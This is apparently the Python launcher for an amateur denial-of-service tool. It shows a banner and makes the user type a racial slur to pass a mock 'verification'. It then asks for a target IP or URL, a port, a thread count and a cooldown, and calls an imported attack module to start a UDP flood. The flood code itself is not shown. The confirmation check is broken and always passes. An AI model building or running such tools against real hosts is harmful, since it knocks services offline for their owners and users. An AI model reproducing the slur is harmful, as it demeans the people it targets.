import time

print(""" 
$$$$$$\ $$\                                           $$$$$$$\                  $$\                                                             
\_$$  _|$$ |                                          $$  __$$\                 $$ |                                                            
  $$ |  $$ | $$$$$$\  $$\  $$\  $$\  $$$$$$\          $$ |  $$ |$$\   $$\  $$$$$$$ | $$$$$$\   $$$$$$\   $$$$$$$\ $$$$$$$$\  $$$$$$$\ $$$$$$$$\ 
  $$ |  $$ | \____$$\ $$ | $$ | $$ | \____$$\ $$$$$$\ $$$$$$$\ |$$ |  $$ |$$  __$$ |$$  __$$\ $$  __$$\ $$  _____|\____$$  |$$  _____|\____$$  |
  $$ |  $$ | $$$$$$$ |$$ | $$ | $$ | $$$$$$$ |\______|$$  __$$\ $$ |  $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |\$$$$$$\    $$$$ _/ $$ /        $$$$ _/ 
  $$ |  $$ |$$  __$$ |$$ | $$ | $$ |$$  __$$ |        $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\  $$  _/   $$ |       $$  _/   
$$$$$$\ $$ |\$$$$$$$ |\$$$$$\$$$$  |\$$$$$$$ |        $$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$$$$$$$\ 
\______|\__| \_______| \_____\____/  \_______|        \_______/  \____$$ | \_______| \____$$ | \______/ \_______/ \________| \_______|\________|
                                                                $$\   $$ |          $$\   $$ |                                                  
                                                                \$$$$$$  |          \$$$$$$  |                                                  
                                                                 \______/            \______/   version: Dev i guess
\n""")
time.sleep(0.69)
print("Ilawa >> Welcome to my DOS tool, this shit is created only for educational purposes! \n")
time.sleep(0.69)
print("Ilawa >> We need to verify that you know what you're doing. Rewrite this phrase: '\033[1m niggers \033[0m'\n")
time.sleep(0.69)
phs = input()

if phs == "niggers":
    
    userAgent = "ukraini slava"
    cooldown = 1

    print("Ilawa >> Verication passed. \n")
    print("Ilawa >> WARNING! TO EXIT PROGRAM PRESS CTRL+C \n")
    print("Ilawa >> Now this tool works only in UDP mode!")
    import attack  # if u do not understand this u're dumbo
    print("Ilawa >> Now u have to put in some data! \n")
    ip = input("Put ur target ip/url \n")
    port = input("Put port that will be attacked \n")
    nawalki = input("Put number of threadads that will make attack (bigger number = better results) max 100 \n")
    cooldown = input("Put cooldown time in miliseconds (cooldown before sending next package) deafult: 1 \n")
        
    if ip is not None and port is not None and nawalki is not None and cooldown is not None:
        print("Ilawa >> All the data has been put \n")
        print("Are u sure that u want make DoS attack ONLY for educational purposes? [Y/n]")
        confirm = input()
        if confirm == "Y" or "y":
            print("Ilawa >> Starting attack...")
            attack.enableAttack(ip=ip, port=port, threadsCount=int(nawalki), cooldown=int(cooldown))
        
        else:
            print("Quiting the program, NAURA!")
            quit()

    else:
        print("Ilawa >> Data Error")
        
else:
    print("Ilawa >> Veryfication Passn't lmao")
